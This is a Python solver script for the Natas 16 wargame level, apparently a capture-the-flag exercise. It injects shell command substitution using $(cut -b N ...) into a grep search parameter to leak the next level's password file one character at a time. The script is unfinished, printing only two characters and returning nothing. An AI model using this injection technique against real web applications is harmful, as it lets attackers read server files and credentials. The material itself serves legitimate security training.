"""
natas16: shell injection, more filtering
"""

import requests
import urllib.parse
from bs4 import BeautifulSoup
from typing import List, Optional

from natas_utils import *

LEVEL = 16

def solve(url: str, login: LevelLogin) -> Optional[str]:
    print(extract_character(url, login, 1))
    print(extract_character(url, login, 2))

    return None
    # this will fail
    # return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))

def extract_character(url: str, login: LevelLogin, offset: int) -> Optional[str]:
    flag_file_abspath = NATAS_DATA['flag_path'] + f"natas{LEVEL + 1}"

    # Preliminary payload: match first chars of words against selected char in password.
    # the `cut` utility allows extraction of single bytes per line
    # using 1-indexed offsets
    payload = f"^$(cut -b {offset} {flag_file_abspath})"

    params = {
        "needle": payload,
        "submit": "Search",
    }
    response = requests.get(url, auth=login, params=params)
    results = get_grep_output(response)

    if len(results) > 0:
        return results[0][0]
    else:
        # if no character match, char is likely a digit
        # Digit payload: match against word length.
        payload = "^.\\{" + f"$(cut -b {offset} {flag_file_abspath})" + "\\}$"
        params["needle"] = payload

        response = requests.get(url, auth=login, params=params)
        results = get_grep_output(response)
        return None if not len(results) > 0 else str(len(results[0]))


def get_grep_output(response: requests.Response) -> List[str]:
    soup = BeautifulSoup(response.text, "html.parser")

    # results are in the only <pre> element on the page, one word per line
    return soup.find("pre").text.split()

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))